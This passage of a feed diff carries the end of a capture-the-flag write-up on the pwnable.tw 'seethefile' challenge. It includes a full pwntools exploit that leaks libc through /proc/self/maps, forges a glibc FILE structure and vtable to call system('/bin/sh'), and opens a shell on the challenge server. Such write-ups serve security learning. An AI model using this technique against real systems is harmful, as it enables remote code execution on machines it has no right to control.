+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p32(elf.symbols[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;name&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;72&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# file-&amp;gt;vtable  vtable-&amp;gt;__dummy2
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p32(libc.symbols[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;system&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;])          &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;#               vtable-&amp;gt;__finish
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;exit(payload)
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;&#x2F;h2&gt;
+&lt;p&gt;This diagram displays my payload (on the right) alongside the corresponding structures. The &lt;code&gt;_IO_jump_t&lt;&#x2F;code&gt; and the 
+&lt;code&gt;_IO_FILE&lt;&#x2F;code&gt; structs are overlaid on each other.&lt;&#x2F;p&gt;
+&lt;p&gt;svg(path=&amp;quot;5e81a81b4304800866d6917b.svg&amp;quot;)&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;final-script&quot;&gt;Final Script&lt;&#x2F;h2&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;pwn &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;*
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;context.binary &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;.&#x2F;seethefile&amp;#39;
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;elf &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ELF(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;.&#x2F;seethefile&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+libc &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ELF(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;.&#x2F;libc_32.so.6&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+r &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;remote(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;chall.pwnable.tw&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;10200&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;openfile&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(path):
+        r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;choice :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+        r.sendline(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;1&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+        r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;see :&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+        r.sendline(path)
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;readfile&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;():
+        r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;choice :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+        r.sendline(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;2&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;writefile&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;():
+        r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;choice :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+        r.sendline(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;3&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;---------------MENU---------------&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)[:&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;---------------MENU---------------&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)]
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;closefile&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;():
+        r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;choice :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+        r.sendline(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;4&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(name):
+        r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;choice :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+        r.sendline(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;5&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+        r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;name :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+        r.sendline(name)
+
+openfile(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&#x2F;proc&#x2F;self&#x2F;maps&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+readfile()
+readfile()
+
+libc.address &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;([x.split(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;-&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;x &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;writefile().split(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;x.endswith(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;.so&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)][&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;], &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Found libc base &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(libc.address))
+info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Address of system &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(libc.symbols[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;system&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;]))
+
+file &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&amp;quot;                                       &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# file
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;file &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p32(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0xFFFFDFFF&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)                         &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# file-&amp;gt;_flags  set _IO_IS_FILEBUF bit to false
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;file &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;;&#x2F;bin&#x2F;sh;&amp;quot;                             &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# file-&amp;gt;???     to be interpreted as a string
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;file.ljust(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;32&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;A&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)                   &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# padding to reach *fp
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p32(elf.symbols[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;name&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;])             &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# *fp           overwrite *fp to point to the start of the name buffer
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;`&amp;#39;                                  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# padding
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;A&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;72&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;37&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)                        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# padding
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p32(elf.symbols[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;filename&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;32&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# file-&amp;gt;_lock   vtable-&amp;gt;__dummy
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p32(elf.symbols[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;name&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;72&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# file-&amp;gt;vtable  vtable-&amp;gt;__dummy2
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p32(libc.symbols[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;system&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;])          &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;#               vtable-&amp;gt;__finish
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;exit(payload)
+
+r.interactive()
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Running this gives us a shell on the remote server:&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;posts&#x2F;pwnable-tw-seethefile&#x2F;5e81ac654304800866d6917d.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;further-reading&quot;&gt;Further Reading&lt;&#x2F;h1&gt;
+&lt;p&gt;These are some resources I found helpful while solving this challenge.&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;elixir.bootlin.com&#x2F;glibc&#x2F;glibc-2.23&#x2F;source&quot;&gt;https:&#x2F;&#x2F;elixir.bootlin.com&#x2F;glibc&#x2F;glibc-2.23&#x2F;source&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.slideshare.net&#x2F;AngelBoy1&#x2F;play-with-file-structure-yet-another-binary-exploit-technique&quot;&gt;https:&#x2F;&#x2F;www.slideshare.net&#x2F;AngelBoy1&#x2F;play-with-file-structure-yet-another-binary-exploit-technique&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;gsec.hitb.org&#x2F;materials&#x2F;sg2018&#x2F;WHITEPAPERS&#x2F;FILE%20Structures%20-%20Another%20Binary%20Exploitation%20Technique%20-%20An-Jie%20Yang.pdf&quot;&gt;https:&#x2F;&#x2F;gsec.hitb.org&#x2F;materials&#x2F;sg2018&#x2F;WHITEPAPERS&#x2F;FILE%20Structures%20-%20Another%20Binary%20Exploitation%20Technique%20-%20An-Jie%20Yang.pdf&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+</content>
+	</entry>
+</feed>
